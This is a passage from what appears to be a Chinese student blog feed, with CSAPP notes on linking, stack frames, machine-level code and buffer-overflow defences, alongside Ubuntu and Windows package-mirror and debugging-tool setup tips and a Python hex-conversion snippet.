title="链接器操作的目标文件"></a>链接器操作的目标文件</h4><p>目标文件一般是由汇编器生成的.o后缀的文件，大概有三种不同的形式：可重定位目标文件；可执行目标文件和共享目标文件。我们接下来讨论的目标文件是基于Unix系统的ELF格式（Exxcutable and Linkable Format），这同Windows系统上的PE（Portable Executable）文件格式在基本概念上其实是相似的：<br>一个典型的ELF可重定位目标文件的格式：<br><img src="1.webp" alt=""></p><pre><code>.text：已编译程序的机器码；.rodata：只读数据（read-only-data）；.data：已初始化的全局C变量；.bss：未初始化的全局C变量（better save space）;.symtab：一个符号表（定义和引用的函数和全局变量信息）；.rel.text：代码重定位条目， 一个.text节中位置的列表，需要修改的位置;.rel.data: 被模块引用或定义的任何全局变量的重定位信息；.debug：一个调试符号表； .line：原始C源程序中的行号和.text机器指令的映射；.strtab: 一个字符串表</code></pre><h4 id="ld任务一-符号解析（符号和符号表）"><a href="#ld任务一-符号解析（符号和符号表）" class="headerlink" title="ld任务一 符号解析（符号和符号表）"></a>ld任务一 符号解析（符号和符号表）</h4><p>保存于.symtab中的是一个符号表，其是定义和引用函数和全局变量的信息。有三种不同类型的符号：全局符号（不带static），外部引用（external）和本地符号。如果是带有static符号的就会在.data和.bss中为每个定义分配空间，并在.symtab中创建一个唯一名字的本地符号。比如：<br>中有两个static定义的x变量，其会在.data中分配空间，并在.symtab中创建两个，x.1表示f函数的定义和x.2表示函数g的定义。（注：使用static可以保护你自己的变量和函数）<br><img src="5.webp" alt=""><br>符号解析任务简单的说，就是链接器使得所有模块中的每个符号只有一个定义。链接器在这一个阶段的主要任务就是把代码中的每个符号引用和确定的一个符号定义联系起来。对于本地符号，这个任务相对来说是简单的。复杂的就是全局符号，编译器（cc1）遇到不是在当前模块中定义的符号时，会假设该符号的定义在其他模块中，生成一个链接器符号交给链接器处理。如果链接器ld在所有的模块中都找不到定义的话就会抛出异常。</p><h4 id="如何链接和解析静态库"><a href="#如何链接和解析静态库" class="headerlink" title="如何链接和解析静态库"></a>如何链接和解析静态库</h4><p>像printf等一些常用的函数，都是在libc.a静态库中，静态库以一种存档的特殊文件（.a）格式，将可以定位的目标文件集合成一个.a文件。<br><img src="6.webp" alt=""></p><h4 id="ld任务二-重定位"><a href="#ld任务二-重定位" class="headerlink" title="ld任务二 重定位"></a>ld任务二 重定位</h4><p>完成了符号解析以后，链接器的第二个任务就是合并输入模块，并为每个符号分配运行时的地址。<br>重定位节和符号定义：在这一步中，链接器将所有模块中的.data节合并成一个文件的.data节，运行时存储器的地址也会赋给新的聚合节。<br>然后就是，重定位节中的符号引用：链接器修改代码节和数据节中对每个符号的引用，使得他们指向正确的运行时地址。这一步要用到重定位条目这一数据结构，我们来描述这个过程：</p><h4 id="可执行目标文件格式"><a href="#可执行目标文件格式" class="headerlink" title="可执行目标文件格式"></a>可执行目标文件格式</h4><p>通过前面知识的学习，我们了解到链接器主要完成了两个工作，符号解析和重新定义。将数据和代码合并成为一个可执行的文件，接下来我们看看这个可执行文件的格式是什么，以及如何加载到存储器中开始运行的过程。<br><img src="7.webp" alt=""></p><pre><code>ELF头部：描述文件总体格式，标注出程序入口点；.init：定义了初始化函数;段头部表：可执行文件是一个连续的片，段头部表中描述了这种映射关系；</code></pre><h4 id="动态链接共享库"><a href="#动态链接共享库" class="headerlink" title="动态链接共享库"></a>动态链接共享库</h4><p>1、 编译时加载<br><img src="8.webp" alt=""><br>静态库需要定期的维护和更新，调用的代码还会拷贝到每个运行的进程中去，这是对存储器系统资源的极大浪费。为了弥补这样的缺陷，我们发明了共享库。共享库的一个主要目的就是允许多个正在运行的进程共享存储器中相同的库代码，节约资源。以(.so)结尾的文件，在运行时被加载到任意存储器地址，并和存储器中的程序链接起来，以后的进程要用到这个库就从这个固定的位置开始访问。这一过程的管理交由动态链接器程序来执行。<br>2、运行时加载共享库<br>微软的windows程序开发人员提供共享库来更新软件，通常要求下载最新的dll库，然后在程序下一次执行的时候会自动链接和加载更新后的共享库。我们创建dll.c文件，运行时加载libvector.so</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP又双叒叕来一遍之函数调用过程栈帧的变化</title>
      <link href="/2018/12/21/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-han-shu-diao-yong-guo-cheng-zhan-zheng-de-bian-hua/"/>
      <url>/2018/12/21/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-han-shu-diao-yong-guo-cheng-zhan-zheng-de-bian-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="函数调用在第三章第七章均有涉及，故专门总结一波函数调用栈帧的变化"><a href="#函数调用在第三章第七章均有涉及，故专门总结一波函数调用栈帧的变化" class="headerlink" title="函数调用在第三章第七章均有涉及，故专门总结一波函数调用栈帧的变化"></a>函数调用在第三章第七章均有涉及，故专门总结一波函数调用栈帧的变化</h2><h4 id="1、熟悉一下程序的进程空间-，即对进程如何使用内存"><a href="#1、熟悉一下程序的进程空间-，即对进程如何使用内存" class="headerlink" title="1、熟悉一下程序的进程空间 ，即对进程如何使用内存"></a>1、熟悉一下程序的进程空间 ，即对进程如何使用内存</h4><p><img src="2.png" alt=""></p><a id="more"></a><p>先讨论32位的计算机，计算机物理内存的大小是固定的，就是计算机主板内存槽上的实际物理内存，cpu可以直接进行寻址，物理内存的容量是固定的，但是寻址的空间取决于cpu地址线的数量。在32位系统上，线性地址空间可达4G（2^32）；这4G一般是按照3：1的比例进行分配，用户进程享有3G的空间，而内核独自享有剩下的1G内存</p><h4 id="2、谈谈栈帧的概念"><a href="#2、谈谈栈帧的概念" class="headerlink" title="2、谈谈栈帧的概念"></a>2、谈谈栈帧的概念</h4><p>栈帧(stack frame)，机器用栈来传递过程参数，存储返回信息，保存寄存器用于以后恢复，以及本地存储。为单个过程(函数调用)分配的那部分栈称为栈帧。<br>栈帧其实 是两个指针寄存器，寄存器%ebp为帧指针（指向该栈帧的最底部），而寄存器%esp为栈指针（指向该栈帧的最顶部），当程序运行时，栈指针可以移动(大多数的信息的访问都是通过帧指针的，换句话说，就是如果该栈存在，%ebp帧指针是不移动的，访问栈里面的元素可以用-4(%ebp）或者8(%ebp)访问%ebp指针下面或者上面的元素)。<br>总之简单 一句话，栈帧的主要作用是用来控制和保存一个过程的所有信息的。栈帧结构如下所示：<br><img src="1.png" alt=""><br>大概解释：假设过程P（调用者）调用过程Q（被调用者），则Q的参数放在P的栈帧中。另外，当P调用Q时，P中的返回地址被压入栈中，形成P的栈帧的末尾 （返回地址就是当程序从Q返回时应该继续执行的地方）。Q的栈帧从保存的帧指针的值开始，后面到新的栈指针之间就是该过程的部分了。</p><h4 id="3、函数具体调用示例"><a href="#3、函数具体调用示例" class="headerlink" title="3、函数具体调用示例"></a>3、函数具体调用示例</h4><p>源代码（忽略主函数）:</p><pre><code>int swap_add(int* xp,int* yp) {    int x = *xp;    int y = *yp;    *xp = y;    *yp = x;    return x+y;}int caller(){    int arg1 = 534;    int arg2 = 1057;    int sum = swap_add(&amp;arg1,&amp;arg2);    int diff = arg1 - arg2;    return sum * diff;}</code></pre><p>经过汇编之后caller部分的代码为：</p><pre><code>caller:    pushl %ebp   //保存%ebp     movl %esp,%ebp    //设置新的帧指针为旧的栈指针    subl $24,%esp  //分配24子节的栈空间    movl $534,-4(%ebp) //设置arg1=534    movl $1057,-8(%ebp) //设置arg2=1057    leal -8(%ebp),%eax //计算&amp;arg2    movl %eax,4(%esp) //将&amp;arg2存入栈中    leal -4(%ebp),%eax //计算&amp;arg1    movl %eax,(%esp) //将&amp;arg1存入栈中    call swap_add //调用swap_add-------------------》过程调用    movl -4(%ebp),%edx /从栈中取出arg1,和arg2的值    subl -8(%ebp),%edx //为了计算diff,     imull %edx,%eax      leave //为返回准备栈，GCC 产生的代码有时候会使用leave指令来释放栈帧，           //而有时会使用一个或者两个popl指令。两个方法都可行。    ret             //从过程调用中返回  </code></pre><p>这段代码先保存了%ebp的一个副本，将新的过程（该函数的ebp）的ebp设置为栈帧的开始位置。然后将栈指针减去24，从而在栈上分配了24字 节的空间（你应该思考一下为什么是24字节,记得有两个为保存的寄存器），然后是初始化两个局部变量，计算两个局部变量的地址并存入栈中，形成了函数swap_add的参数。将这些 参数存储到相对于栈指针偏移量为0和+4的地方，留待稍后的swap_add调用访问。然后调用swap_add</p><pre><code>swap_add:    pushl %ebp //save old %ebp    movl %esp,%ebp  //set %ebp as frame pointer    pushl %ebx     //save %ebx    movl 8(%ebp),%edx   //Get xp    movl 12(%ebp),%ecx   //Get yp    movl (%edx),%ebx   //Get x    movl (%ecx),%eax    //Get u    movl %eax,(%edx)    //Store y as xp    movl %ebx,(%ecx)      //Sotre x as yp    addl %ebx,%eax         //return value = x + y    popl %ebx        //restore  %ebx    popl %ebp        //restore %ebp    ret        //从过程调用中返回, 将控制转移回caller</code></pre><p>说明三点，1、说明一点程序在执行到swap_add的代码之前，也就是在执行call语句已经把返回地址压入栈中，包括%esp-4. 2、最后一部 分的popl %ebx   popl %ebp。它的作用是恢复了之前存储的栈帧指针的值.  3、返回值是存入了%eax中，在接下来的调用程序caller中直接访问该寄存器</p><h4 id="整个过程的栈变化如下所示"><a href="#整个过程的栈变化如下所示" class="headerlink" title="整个过程的栈变化如下所示"></a>整个过程的栈变化如下所示</h4><p><img src="3.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈帧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16环境配置-换源</title>
      <link href="/2018/12/20/ge-chong-yuan-shi-yong-guo-nei-jing-xiang-jian-dan-pei-zhi/"/>
      <url>/2018/12/20/ge-chong-yuan-shi-yong-guo-nei-jing-xiang-jian-dan-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h3 id="一、windows"><a href="#一、windows" class="headerlink" title="一、windows"></a>一、windows</h3><h4 id="1、windows环境下-pip换国内镜像"><a href="#1、windows环境下-pip换国内镜像" class="headerlink" title="1、windows环境下 pip换国内镜像"></a>1、windows环境下 pip换国内镜像</h4><p>1、打开user目录，user目录可以通过win+R 然后添加 %APPDATA% (不区分大小写)<br><img src="1.PNG" alt=""></p><a id="more"></a><p>2、直接在中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini：<br><img src="2.PNG" alt=""><br>3、拿任意文本编辑器打开，添加以下内容</p><pre><code>[global]timeout = 6000index-url = http://pypi.douban.com/simpletrusted-host = pypi.douban.com</code></pre><p>保存即可</p><h4 id="1-2、win10-换npm-源"><a href="#1-2、win10-换npm-源" class="headerlink" title="1.2、win10 换npm 源"></a>1.2、win10 换npm 源</h4><pre><code>npm config set registry https://registry.npm.taobao.orgnpm install gulp less --save-dev</code></pre><p>然后输入</p><pre><code>npm config list</code></pre><p>出现一条<code>registry = &quot;https://registry.npm.taobao.org/&quot;</code>则成功</p><h3 id="二、Ubuntu"><a href="#二、Ubuntu" class="headerlink" title="二、Ubuntu"></a>二、Ubuntu</h3><h4 id="2-1、Ubuntu环境下-pip换国内镜像"><a href="#2-1、Ubuntu环境下-pip换国内镜像" class="headerlink" title="2.1、Ubuntu环境下 pip换国内镜像"></a>2.1、Ubuntu环境下 pip换国内镜像</h4><p>1、在主目录下创建.pip文件夹,然后在该目录下创建pip.conf文件</p><pre><code>mkdir ~/.pipvim ~/.pip/pip.conf</code></pre><p>2、pip.conf文件编写如下内容（更换为清华大学镜像源）：</p><pre><code>[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple </code></pre><h4 id="2-2、Ubuntu更换系统源-apt-get"><a href="#2-2、Ubuntu更换系统源-apt-get" class="headerlink" title="2.2、Ubuntu更换系统源 apt-get"></a>2.2、Ubuntu更换系统源 apt-get</h4><p>1、复制原文件备份</p><pre><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></pre><p>2、编辑源列表文件(对vim不熟可使用gedit)</p><pre><code>sudo vim /etc/apt/sources.list</code></pre><p>3、将原来的列表删除，添加如下内容</p><pre><code>deb http://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-proposed main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</code></pre><p>4、更新本地索引列表运行</p><pre><code>sudo apt-get update #更新本地索引列表#sudo apt-get upgrade # 可选/根据更新的索引升级已安装的所有软件包</code></pre><h4 id="2-3、ubuntu-换npm-源"><a href="#2-3、ubuntu-换npm-源" class="headerlink" title="2.3、ubuntu 换npm 源"></a>2.3、ubuntu 换npm 源</h4><pre><code>npm config set registry https://registry.npm.taobao.org</code></pre><h4 id="2-4、ubuntu打开终端自动定位到桌面"><a href="#2-4、ubuntu打开终端自动定位到桌面" class="headerlink" title="2.4、ubuntu打开终端自动定位到桌面"></a>2.4、ubuntu打开终端自动定位到桌面</h4><pre><code>sudo gedit ~/.bashrc</code></pre><p>后面加入</p><pre><code>if [[ $PWD == $(realpath ~) ]]; then    cd ~/Desktop/fi</code></pre><p>如果是中文系统把Desktop改为桌面</p><h4 id="2-5、32位运行库"><a href="#2-5、32位运行库" class="headerlink" title="2.5、32位运行库"></a>2.5、32位运行库</h4><pre><code>sudo apt-get install gcc-multilibsudo apt-get install libc6:i386</code></pre><h4 id="2-6、一些推荐的软件"><a href="#2-6、一些推荐的软件" class="headerlink" title="2.6、一些推荐的软件"></a>2.6、一些推荐的软件</h4><pre><code>sudo apt-get install gdebi#安装debsudo apt-get install synaptic#新立得软件包管理器sudo apt install python-pipsudo apt install python3-pip#python包管理器sudo apt-get install vimsudo apt-get install git</code></pre><h4 id="2-7、pwn环境配置"><a href="#2-7、pwn环境配置" class="headerlink" title="2.7、pwn环境配置"></a>2.7、pwn环境配置</h4><pre><code>git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh#pwngdb,调试神器sudo apt-get install gcc-multilibsudo apt-get install libc6:i386#64位系统跑32位程序pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools#pwntools</code></pre><h3 id="3、显卡问题导致开机卡住"><a href="#3、显卡问题导致开机卡住" class="headerlink" title="3、显卡问题导致开机卡住"></a>3、显卡问题导致开机卡住</h3><p>安装Linux 双系统（一般是Nvidia显卡，1080p加核显的电脑）时，经常会出现卡在安装logo的问题，这种原因一般是由于linux发行商收录的nouveau 的开源显卡的问题。针对这种情况，解决方案如下：<br>在进入grub安装界面的时候，在Install Ubuntu选项，按e,进入命令行模式，然后在quiet slash – 后面(也可能没有 – )，添加以下内容，然后按F10重新引导</p><pre><code>acpi_osi=linux nomodeset</code></pre><p>然后能开机，但是每次重启都要来一次，所以解决方法是</p><pre><code>sudo gedit /etc/modprobe.d/blacklist.conf</code></pre><p>在文本最后添加：（禁用nouveau第三方驱动，之后也不需要改回来）</p><pre><code>blacklist nouveauoptions nouveau modeset=0</code></pre><p>然后执行：</p><pre><code>sudo update-initramfs -u</code></pre><p>即可</p>]]></content>
      
      
      <categories>
          
          <category> 计算机杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 换源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用python进行两位十六进制换字符串</title>
      <link href="/2018/12/14/li-yong-python-jin-xing-liang-wei-shi-liu-jin-zhi-huan-zi-fu-chuan/"/>
      <url>/2018/12/14/li-yong-python-jin-xing-liang-wei-shi-liu-jin-zhi-huan-zi-fu-chuan/</url>
      
        <content type="html"><![CDATA[<h3 id="如果你只是简单的解码或编码一个十六进制的原始字符串，可以使用-binascii-模块。例如："><a href="#如果你只是简单的解码或编码一个十六进制的原始字符串，可以使用-binascii-模块。例如：" class="headerlink" title="如果你只是简单的解码或编码一个十六进制的原始字符串，可以使用　binascii 模块。例如："></a>如果你只是简单的解码或编码一个十六进制的原始字符串，可以使用　binascii 模块。例如：</h3><pre><code>&gt;&gt;&gt; s = b&#39;hello&#39;&gt;&gt;&gt; import binascii&gt;&gt;&gt; h = binascii.b2a_hex(s)&gt;&gt;&gt; hb&#39;68656c6c6f&#39;&gt;&gt;&gt; binascii.a2b_hex(h)b&#39;hello&#39;</code></pre><a id="more"></a><h3 id="类似的功能同样可以在-base64-模块中找到。例如："><a href="#类似的功能同样可以在-base64-模块中找到。例如：" class="headerlink" title="类似的功能同样可以在 base64 模块中找到。例如："></a>类似的功能同样可以在 base64 模块中找到。例如：</h3><pre><code>&gt;&gt;&gt; s = b&#39;hello&#39;&gt;&gt;&gt; import base64&gt;&gt;&gt; h = base64.b16encode(s)&gt;&gt;&gt; hb&#39;68656C6C6F&#39;&gt;&gt;&gt; base64.b16decode(h)b&#39;hello&#39;&gt;&gt;&gt;</code></pre><h3 id="讨论"><a href="#讨论" class="headerlink" title="讨论:"></a>讨论:</h3><p>大部分情况下，通过使用上述的函数来转换十六进制是很简单的。 上面两种技术的主要不同在于大小写的处理。 函数 base64.b16decode() 和 base64.b16encode() 只能操作大写形式的十六进制字母， 而 binascii 模块中的函数大小写都能处理。</p><h3 id="还有一点需要注意的是编码函数所产生的输出总是一个字节字符串。-如果想强制以Unicode形式输出，你需要增加一个额外的界面步骤。例如："><a href="#还有一点需要注意的是编码函数所产生的输出总是一个字节字符串。-如果想强制以Unicode形式输出，你需要增加一个额外的界面步骤。例如：" class="headerlink" title="还有一点需要注意的是编码函数所产生的输出总是一个字节字符串。 如果想强制以Unicode形式输出，你需要增加一个额外的界面步骤。例如："></a>还有一点需要注意的是编码函数所产生的输出总是一个字节字符串。 如果想强制以Unicode形式输出，你需要增加一个额外的界面步骤。例如：</h3><pre><code>&gt;&gt;&gt; h = base64.b16encode(s)&gt;&gt;&gt; print(h)b&#39;68656C6C6F&#39;&gt;&gt;&gt; print(h.decode(&#39;ascii&#39;))68656C6C6F&gt;&gt;&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进制转换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP又双叒叕来一遍之程序的机器级表示</title>
      <link href="/2018/12/06/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-cheng-xu-de-ji-qi-ji-biao-shi/"/>
      <url>/2018/12/06/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-cheng-xu-de-ji-qi-ji-biao-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="一、本章主要内容"><a href="#一、本章主要内容" class="headerlink" title="一、本章主要内容"></a>一、本章主要内容</h2><p><img src="renwu.png" alt=""></p><a id="more"></a><h2 id="二、程序编码"><a href="#二、程序编码" class="headerlink" title="二、程序编码"></a>二、程序编码</h2><h4 id="计算机系统使用了多种不同形式的抽象，利用更简单的抽象模型来隐藏实现的细节。对于机器级编程来说，其中两种抽象尤为重要："><a href="#计算机系统使用了多种不同形式的抽象，利用更简单的抽象模型来隐藏实现的细节。对于机器级编程来说，其中两种抽象尤为重要：" class="headerlink" title="计算机系统使用了多种不同形式的抽象，利用更简单的抽象模型来隐藏实现的细节。对于机器级编程来说，其中两种抽象尤为重要："></a>计算机系统使用了多种不同形式的抽象，利用更简单的抽象模型来隐藏实现的细节。对于机器级编程来说，其中两种抽象尤为重要：</h4><ol><li><p>指令集体系结构或指令级框架：它定义了处理器状态、指令的格式，以及每条指令对状态的影响。<br>IA32将程序的行为描述成好像每条指令时按顺序执行的，一条指令结束后，下一条再开始。（实际上处理器并发地执行许多指令，但是可以采取措施保证整体行为与ISA指定的顺序执行完全一致）</p></li><li><p>机器级程序使用的存储器地址是虚拟地址：提供的存储器模型看上去是一个非常大的字节数组。存储器系统的实际实现是将多个硬件存储器和操作系统软件组合起来。</p></li></ol><h4 id="程序存储器-program-memory-包含："><a href="#程序存储器-program-memory-包含：" class="headerlink" title="程序存储器(program memory)包含："></a>程序存储器(program memory)包含：</h4><p> 程序的可执行机器代码、操作系统需要的一些信息、栈、堆。程序存储器用虚拟地址来寻址（此虚拟地址不是机器级虚拟地址）。操作系统负责管理虚拟地址空间（程序级虚拟地址），将虚拟地址翻译成实际处理器存储器中的物理地址（机器级虚拟地址）。</p><h2 id="三、拿一个C自己玩玩"><a href="#三、拿一个C自己玩玩" class="headerlink" title="三、拿一个C自己玩玩"></a>三、拿一个C自己玩玩</h2><ol><li>用c语言写一个代码文件hello.c</li><li>在命令行上使用“-S”选项，就能看到C语言编译器产生的汇编代码<pre><code>Linux&gt; gcc -Og -S hello.c</code></pre></li><li>编译为可执行文件<pre><code>Linux&gt; gcc -o hello  hello.c</code></pre></li><li>看机器代码文件的内容，有一类称为反汇编器，带“-d”命令行<pre><code>linux&gt; objdump -d hello</code></pre>(ps：汇编指令单独写博客，本地不展开)<h2 id="四、-过程"><a href="#四、-过程" class="headerlink" title="四、 过程"></a>四、 过程</h2></li></ol><ul><li>过程是软件中一种很重要的抽象。它提供了一种封装代码的方式，用一组指定的参数和一个可选的返回值实现某种功能。然后，可以在程序中不同的地方调用这个函数。过程机制的构建需要实现传递控制、传递数据、分配和释放内存。</li><li>当x86-64过程需要的存储空间超出寄存器能够存放的大小时，就会在栈上分配空间。这个部分称为过程的栈帧。<br><img src="zhan.png" alt=""></li></ul><p>（栈在过程中的变化单独细讲，本处不展开）</p><h2 id="五、异质的数据结构"><a href="#五、异质的数据结构" class="headerlink" title="五、异质的数据结构"></a>五、异质的数据结构</h2><h4 id="Struct-和-Union有下列区别："><a href="#Struct-和-Union有下列区别：" class="headerlink" title="Struct 和 Union有下列区别："></a>Struct 和 Union有下列区别：</h4><ul><li>在存储多个成员信息时，编译器会自动给struct第1个成员分配存储空间，struct 可以存储多个成员信息，而Union每个成员会用同一个存储空间，只能存储最后一个成员的信息。</li><li>都是由多个不同的数据类型成员组成，但在任何同一时刻，Union只存放了一个被先选中的成员，而结构体的所有成员都存在。</li><li>对于Union的不同成员赋值，将会对其他成员重写，原来成员的值就不存在了，而对于struct 的不同成员赋值 是互不影响的。</li></ul><h2 id="六、对抗缓冲区溢出攻击"><a href="#六、对抗缓冲区溢出攻击" class="headerlink" title="六、对抗缓冲区溢出攻击"></a>六、对抗缓冲区溢出攻击</h2><h4 id="1、栈随机化（ASLR和PIE）"><a href="#1、栈随机化（ASLR和PIE）" class="headerlink" title="1、栈随机化（ASLR和PIE）"></a>1、栈随机化（ASLR和PIE）</h4><p>为了在系统中插入攻击代码，攻击者不但要插入代码，还要插入指向这段代码的指针，这个指针也是攻击字符串的一部分。产生这个指针需要知道这个字符串放置的栈地址。在过去，程序的栈地址非常容易预测，在不同的机器之间，栈的位置是相当固定的。<br>栈随机化的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行相同的代码。它们的栈地址都是不同的。<br>实现的方式是：程序开始时，在栈上分配一段0–n字节之间的随机大小空间。程序不使用这段空间，但是它会导致程序每次执行时后续的栈位置发生了变化。<br>在Linux系统中，栈随机化已经变成了标准行为。（在linux上每次运行相同的程序，其同一局部变量的地址都不相同）</p><h4 id="2、栈破坏检测"><a href="#2、栈破坏检测" class="headerlink" title="2、栈破坏检测"></a>2、栈破坏检测</h4><p>在C语言中，没有可靠的方法来防止对数组的越界写，但是，我们能够在发生了越界写的时候，在没有造成任何有害结果之前，尝试检测到它。<br>最近的GCC版本在产生的代码中加入了一种栈保护者机制，用来检测缓冲区越界，其思想是在栈中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值。这个金丝雀值是在程序每次运行时随机产生的，因此，攻击者没有简单的办法知道它是什么。<br>在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者函数调用的某个操作改变了。如果是，那么程序异常终止。<br><img src="jinsique.png" alt=""></p><h4 id="3、限制可执行代码区域"><a href="#3、限制可执行代码区域" class="headerlink" title="3、限制可执行代码区域"></a>3、限制可执行代码区域</h4><p>限制那些能够存放可执行代码的存储器区域。在典型的程序中，只有保存编译器产生的代码的那部分存储器才需要是可执行的，其他部分可以被限制为只允许读和写。<br>现在的64位处理器的内存保护引入了”NX”(不执行)位。有了这个特性，栈可以被标记为可读和可写，但是不可执行，检查页是否可执行由硬件来完成，效率上没有损失。</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP又双叒叕来一遍之计算机系统漫游</title>
      <link href="/2018/12/03/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-ji-suan-ji-xi-tong-man-you/"/>
      <url>/2018/12/03/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-ji-suan-ji-xi-tong-man-you/</url>
      
        <content type="html"><![CDATA[<h2 id="说在前面的一些废话，如果你困了，请直接跳至正文"><a href="#说在前面的一些废话，如果你困了，请直接跳至正文" class="headerlink" title="说在前面的一些废话，如果你困了，请直接跳至正文"></a>说在前面的一些废话，如果你困了，请直接跳至正文</h2><h5 id="刚入学就买的这本《深入理解计算机系统》。一年多来，学学停停，但是永远记住了第一章第二段的第二句话"><a href="#刚入学就买的这本《深入理解计算机系统》。一年多来，学学停停，但是永远记住了第一章第二段的第二句话" class="headerlink" title="刚入学就买的这本《深入理解计算机系统》。一年多来，学学停停，但是永远记住了第一章第二段的第二句话"></a>刚入学就买的这本《深入理解计算机系统》。一年多来，学学停停，但是永远记住了第一章第二段的第二句话</h5><pre><code>如果你全力投身学习本书的概念，完全理解底层计算机系统以及它对应用程序的影响那么你会走向为数不多的“大牛”的道路</code></pre><a id="more"></a><h5 id="好一个大牛的道路，对于热爱计算机的人来说的“大牛的道路”-和-爱好钱财的人的“富婆包养路”（或者是富萝莉）地位相同"><a href="#好一个大牛的道路，对于热爱计算机的人来说的“大牛的道路”-和-爱好钱财的人的“富婆包养路”（或者是富萝莉）地位相同" class="headerlink" title="好一个大牛的道路，对于热爱计算机的人来说的“大牛的道路” 和 爱好钱财的人的“富婆包养路”（或者是富萝莉）地位相同"></a>好一个大牛的道路，对于热爱计算机的人来说的“大牛的道路” 和 爱好钱财的人的“富婆包养路”（或者是富萝莉）地位相同</h5><p>在这句话的驱动下（多少人和我一样啊），这本书是我花费最多时间和精力去啃的专业书籍<br>这本书确实无敌到能让一个完全不懂的孩童般见识到了计算机专业广阔无垠、波澜壮阔的海洋。<br>惭愧的是自己完全没有达到大牛们啃完后通彻计算机系统的境界<br>即便是如此我还是受益匪浅，CSAPP无愧为计算机专业的神书！<br>如今我已经大二，按理说是踌躇满志的时候，我却满是遗憾，遗憾自己大一后半学期的固步自封，<br>浪费了那么多宝贵的青春年华在毫无意义的事物上，追求短暂的愉悦却荒芜了年华。</p><h4 id="但是往昔不可忆，切记不要再浪费自己的青春和元气。"><a href="#但是往昔不可忆，切记不要再浪费自己的青春和元气。" class="headerlink" title="但是往昔不可忆，切记不要再浪费自己的青春和元气。"></a>但是往昔不可忆，切记不要再浪费自己的青春和元气。</h4><h2 id="所以重整旗鼓，这回想认真总结一下（感言结束，疯狂暗示♂）"><a href="#所以重整旗鼓，这回想认真总结一下（感言结束，疯狂暗示♂）" class="headerlink" title="所以重整旗鼓，这回想认真总结一下（感言结束，疯狂暗示♂）"></a>所以重整旗鼓，这回想认真总结一下（感言结束，疯狂暗示♂）</h2><h3 id="一、分析hello-c的例子，从其生命周期分析系统的执行过程"><a href="#一、分析hello-c的例子，从其生命周期分析系统的执行过程" class="headerlink" title="一、分析hello.c的例子，从其生命周期分析系统的执行过程"></a>一、分析hello.c的例子，从其生命周期分析系统的执行过程</h3><p>hello.c 源代码：</p><pre><code>#include&lt;stdio.h&gt;int main(){   printf(&quot;hello world&quot;);   return 0;}</code></pre><p>在Unix系统上,从源文件到目标文件的转化是由编译器驱动程序完成的:</p><pre><code>unix&gt;gcc -o hello hello.c</code></pre><p><img src="huibian.jpg" alt=""></p><h4 id="执行这四个阶段的程序-预处理器、编译器、汇编器、链接器-一起构成了编译系统-compilation-system"><a href="#执行这四个阶段的程序-预处理器、编译器、汇编器、链接器-一起构成了编译系统-compilation-system" class="headerlink" title="执行这四个阶段的程序(预处理器、编译器、汇编器、链接器)一起构成了编译系统(compilation system)."></a>执行这四个阶段的程序(预处理器、编译器、汇编器、链接器)一起构成了编译系统(compilation system).</h4><ol><li>预处理阶段:也就是对程序进行预处理。C程序中特指“”#“”包含的库文件。预处理器将库文件直接导入到源代码中，<br>此例就是将头文件“stdio.h”导入到源程序中，生成hello.i源代码。</li><li>编译阶段:编译器(ccl)将文本文件hello.i翻译成文本文件hello.s,它包含一个汇编语言程序.</li><li>汇编阶段: 将汇编语言转化为机器指令,生成二进制文件——hello.o。</li><li>链接阶段.目标文件合并到我们的hello.o程序中,链接器就处理这种合并.得到hello文件,一个可执行目标文件,可以被加载到内存中,由系统执行.</li></ol><h3 id="二、信息就是位-上下文"><a href="#二、信息就是位-上下文" class="headerlink" title="二、信息就是位+上下文"></a>二、信息就是位+上下文</h3><p>源程序实际上就是由一个值0和1组成的位(bit)序列,8个位被组织成一组,称为字节.每个字节表示程序中某个文本字符.<br>大部分现代系统都是有ASCII标准表示文本字符,只由ASCII字符构成的文件称为文本文件,所有其他文件都称为二进制文件<br>系统中所有的信息—–包括磁盘文件、存储器中的程序、存储器中存放的用户数据以及网络上传送的数据,都是由一串位表示的.区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文.比如:在不同的上下文中,一个同样的字节序列可能表示一个整数、浮点数、字符串或者机器指令. </p><h3 id="三、系统的硬件组成"><a 